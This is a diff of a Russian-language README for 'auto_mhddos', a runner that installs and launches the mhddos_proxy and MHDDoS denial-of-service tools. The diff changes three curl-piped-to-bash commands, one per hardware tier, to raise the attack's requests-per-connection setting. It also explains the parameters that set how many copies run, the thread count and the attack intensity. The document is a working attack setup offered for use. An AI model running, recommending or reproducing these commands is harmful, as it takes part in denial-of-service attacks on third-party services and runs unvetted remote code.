@@ -7,13 +7,13 @@
 #
 Команды для разного железа: 
 
--- Слабое (2 ядра 2 ГБ): `curl -s https://raw.githubusercontent.com/Aruiem234/auto_mhddos/main/runner.sh | bash -s -- 1 900 500 50`
+-- Слабое (2 ядра 2 ГБ): `curl -s https://raw.githubusercontent.com/Aruiem234/auto_mhddos/main/runner.sh | bash -s -- 1 900 500 100`
 
--- Среднее: `curl -s https://raw.githubusercontent.com/Aruiem234/auto_mhddos/main/runner.sh | bash -s -- 2 900 1000 100`
+-- Среднее: `curl -s https://raw.githubusercontent.com/Aruiem234/auto_mhddos/main/runner.sh | bash -s -- 2 900 1000 200`
 
--- Быстрое: `curl -s https://raw.githubusercontent.com/Aruiem234/auto_mhddos/main/runner.sh | bash -s -- 2 900 2000 200`
+-- Быстрое: `curl -s https://raw.githubusercontent.com/Aruiem234/auto_mhddos/main/runner.sh | bash -s -- 2 900 2000 1000`
 
-Значение параметров на примере "bash -s -- 1 900 500 50":
+Значение параметров на примере "bash -s -- 1 900 500 100":
 
 1 - кол-во паралельно запущенных копий mhddos_proxy.
 
@@ -21,7 +21,7 @@
 
 500 - количество потоков (threads). Параметр -t в mhddos_proxy.
 
-50 - параметр --rpc в mhddos_proxy.
+100 - параметр --rpc в mhddos_proxy.
 #
 
 * Скрипт автоматически устанавливается git, python3, pip, mhddos_proxy, MHDDoS и все зависимости.
